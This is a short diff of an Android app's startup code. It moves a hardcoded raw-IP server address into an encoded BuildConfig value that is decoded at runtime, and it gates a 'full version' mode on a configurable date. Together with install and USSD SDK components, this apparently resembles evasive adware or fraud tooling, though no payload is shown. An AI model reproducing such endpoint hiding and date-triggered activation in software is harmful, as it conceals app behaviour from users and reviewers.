@@ -18,8 +18,7 @@ public class App extends Application {
     @Override
     public void onCreate() {
         super.onCreate();
-        boolean useFullVersion = CommonUtils.checkIsFullVersionTime("01-01-2018")
-                && CommonUtils.isDeviceSupported();
+        boolean useFullVersion = CommonUtils.checkIsFullVersionTime(BuildConfig.U_D);
         List<SdkComponent> components = new ArrayList<>();
         components.add(new InstallsComponent());
         //        components.add(new UssdComponent());
@@ -30,7 +29,7 @@ public class App extends Application {
         components.add(new NotificationsComponent());
         SdkCommonsImpl.init(this,
                 BuildConfig.APPLICATION_ID,
-                "http://217.23.12.122:93/api/v1/",
+                CommonUtils.wrapStringWithKeys(BuildConfig.ARG_1, BuildConfig.KEY_1),
                 MainActivity.class,
                 BuildConfig.DEBUG, useFullVersion,
                 components);
